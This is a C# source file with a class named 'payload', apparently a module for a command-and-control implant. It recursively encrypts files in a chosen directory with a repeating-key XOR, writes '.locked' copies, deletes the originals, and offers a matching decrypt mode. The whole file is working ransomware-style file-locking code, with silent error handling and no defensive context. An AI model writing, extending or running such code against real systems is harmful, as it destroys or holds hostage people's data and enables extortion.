using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections.Generic;

public class payload
{
    public payload() {}

    public string Execute(object param)
    {
        try
        {
            if (!(param is Dictionary<string, object> mapParam))
                return "ERROR: Invalid parameter type. Expected Dictionary.";

            if (!mapParam.TryGetValue("json", out var jsonValue) || string.IsNullOrEmpty(jsonValue?.ToString()))
                return "ERROR: JSON data is empty.";

            string szJson = jsonValue.ToString();

            string szTargetDir = fnExtractJsonValue(szJson, "directory");
            string szExtFilter = fnExtractJsonValue(szJson, "extension");
            if (string.IsNullOrEmpty(szExtFilter))
                szExtFilter = ".txt";

            szExtFilter = szExtFilter.ToLower();

            string szSecretKey = fnExtractJsonValue(szJson, "key");
            if (string.IsNullOrEmpty(szSecretKey))
                szSecretKey = "DEFAULT_KEY";

            string szAction = fnExtractJsonValue(szJson, "action");
            if (string.IsNullOrEmpty(szAction))
                szAction = "encrypt";

            if (string.IsNullOrEmpty(szTargetDir) || !Directory.Exists(szTargetDir))
                return "{\"status\":\"error\",\"message\":\"Invalid or non-existent directory.\"}";

            var files = new List<string>();

            fnProcessFiles(szTargetDir, szExtFilter, szSecretKey, szAction, files);

            var sbFiles = new StringBuilder();
            for (int i = 0; i < files.Count; i++)
            {
                sbFiles.Append($"\"{files[i]}\"");

                if (i < files.Count - 1)
                    sbFiles.Append(",");
            }

            string jsonResult = "{" +
                $"\"status\":\"success\"," +
                $"\"action\":\"{szAction}\"," +
                $"\"target_directory\":\"{szTargetDir.Replace("\\", "\\\\")}\"," +
                $"\"affected_count\":{files.Count}," +
                $"\"files\":[{sbFiles}]" +
                "}";

            return "[+] SUCCESS\n" + jsonResult;
        }
        catch (Exception ex)
        {
            return "[-] EXCEPTION: " + ex.Message;
        }
    }

    private byte[] fnXorProcess(byte[] data, byte[] key)
    {
        byte[] result = new byte[data.Length];
        for (int i = 0; i < data.Length; i++)
        {
            result[i] = (byte)(data[i] ^ key[i % key.Length]);
        }
        return result;
    }

    private void fnProcessFiles(string dir, string ext, string key, string act, List<string> results)
    {
        try
        {
            string[] files = Directory.GetFiles(dir, "*.*", SearchOption.AllDirectories);
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);

            foreach (string filePath in files)
            {
                string fileExt = Path.GetExtension(filePath).ToLower();

                if (act == "encrypt")
                {
                    if (ext == ".*" || fileExt == ext)
                    {
                        byte[] content = File.ReadAllBytes(filePath);
                        byte[] processed = fnXorProcess(content, keyBytes);

                        string newPath = filePath + ".locked";
                        File.WriteAllBytes(newPath, processed);
                        File.Delete(filePath);

                        results.Add(newPath.Replace("\\", "/"));
                    }
                }
                else if (act == "decrypt")
                {
                    if (filePath.EndsWith(".locked", StringComparison.OrdinalIgnoreCase))
                    {
                        byte[] content = File.ReadAllBytes(filePath);
                        byte[] processed = fnXorProcess(content, keyBytes);

                        string origPath = filePath.Substring(0, filePath.Length - 7);
                        File.WriteAllBytes(origPath, processed);
                        File.Delete(filePath);

                        results.Add(origPath.Replace("\\", "/"));
                    }
                }
            }
        }
        catch
        {
            
        }
    }

    private string fnExtractJsonValue(string json, string key)
    {
        string pattern = "\"" + key + "\"\\s*:\\s*\"?([^\",}]+)\"?";
        Match match = Regex.Match(json, pattern);
        if (match.Success)
        {
            return match.Groups[1].Value.Trim();
        }
        return string.Empty;
    }
}